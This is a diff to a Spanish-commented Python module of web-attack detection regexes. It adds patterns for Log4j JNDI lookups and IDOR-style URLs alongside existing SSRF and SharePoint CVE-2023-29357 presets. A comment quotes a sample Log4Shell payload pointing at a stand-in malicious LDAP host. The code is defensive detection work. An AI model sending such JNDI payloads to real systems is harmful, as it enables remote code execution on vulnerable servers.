@@ -35,16 +35,25 @@ PRESETS = {
     'ssrf': r'(?i)(http[s]?://(127\.0\.0\.1|localhost))',
 
     # SharePoint (CVE-2023-29357): Detecta solicitudes sospechosas dirigidas a endpoints de SharePoint
-    # que se han relacionado con el CVE-2023-29357. Se capturan rutas como:
+    # relacionados con el CVE-2023-29357. Se capturan rutas como:
     # /_api/web/siteusers, /_api/web/siteusers/... o /_api/web/currentuser.
-    'sharepoint': r'(?i)/_api/web/(siteusers|currentuser)(/.*)?'
+    'sharepoint': r'(?i)/_api/web/(siteusers|currentuser)(/.*)?',
+
+    # Log4j: Detecta posibles intentos de explotación de vulnerabilidades en log4j
+    # mediante patrones JNDI, por ejemplo: ${jndi:ldap://malicious.example.com/a}
+    'log4j': r'(?i)\$\{jndi:(?:ldap|rmi|dns):\/\/[^\}]+\}',
+
+    # IDOR: Insecure Direct Object References. Detecta accesos directos a objetos,
+    # por ejemplo, URLs que incluyen rutas o parámetros con identificadores numéricos
+    # sospechosos como /user/123 o ?id=456.
+    'idor': r'(?i)(?:/user/\d+|[?&](?:id|uid|user_id|account_id)=\d+)'
 }
 
 def get_preset(attack_type):
     """
     Retorna la expresión regular asociada al preset del ataque web indicado.
     
-    :param attack_type: Nombre del ataque (ej: 'xss', 'sql_injection', 'sharepoint', etc.)
+    :param attack_type: Nombre del ataque (ej: 'xss', 'sql_injection', 'sharepoint', 'log4j', 'idor', etc.)
     :return: Cadena con la expresión regular correspondiente.
     :raises Exception: Si no se encuentra el preset para el ataque indicado.
     """
